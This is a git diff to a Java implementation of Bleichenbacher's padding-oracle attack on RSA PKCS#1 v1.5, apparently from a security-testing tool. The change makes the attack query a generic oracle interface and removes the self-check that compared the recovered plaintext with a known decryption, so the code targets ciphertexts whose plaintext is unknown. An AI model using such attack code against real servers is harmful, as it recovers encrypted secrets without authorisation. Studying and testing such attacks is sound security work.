@@ -20,8 +20,8 @@ import javax.crypto.Cipher;
  */
 public class BleichenbacherAttack {
 
-    protected final Oracle oracle;
-    protected final byte[] decryptedMsg;
+    protected final IOracle oracle;
+    //protected final byte[] decryptedMsg;
     protected final byte[] encryptedMsg;
     protected final RSAPublicKey publicKey;
     protected BigInteger c0;
@@ -32,9 +32,9 @@ public class BleichenbacherAttack {
     protected final BigInteger bigB;
 
     public BleichenbacherAttack(final byte[] msg, RSAPublicKey pubKey,
-            Oracle pkcsOracle) {
+            IOracle pkcsOracle) {
         this.encryptedMsg = msg.clone();
-        this.publicKey = pubKey;
+        this.publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
         this.oracle = pkcsOracle;
         c0 = BigInteger.ZERO;
         si = BigInteger.ZERO;
@@ -51,8 +51,8 @@ public class BleichenbacherAttack {
         bigB = BigInteger.valueOf(2).pow(tmp);
         System.out.println("B computed: " + bigB);
         System.out.println("Blocksize: " + blockSize);
-        decryptedMsg = oracle.decrypt(encryptedMsg);
-        System.out.println("our goal: " + new BigInteger(decryptedMsg));
+        //decryptedMsg = oracle.decrypt(encryptedMsg);
+        //System.out.println("our goal: " + new BigInteger(decryptedMsg));
     }
 
     public void attack() {
@@ -276,10 +276,10 @@ public class BleichenbacherAttack {
             BigInteger solution = s0.modInverse(publicKey.getModulus());
             solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
 
-            if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
+            //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
                 System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
-                System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
-            }
+            //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
+            //}
             
             result = true;
         }
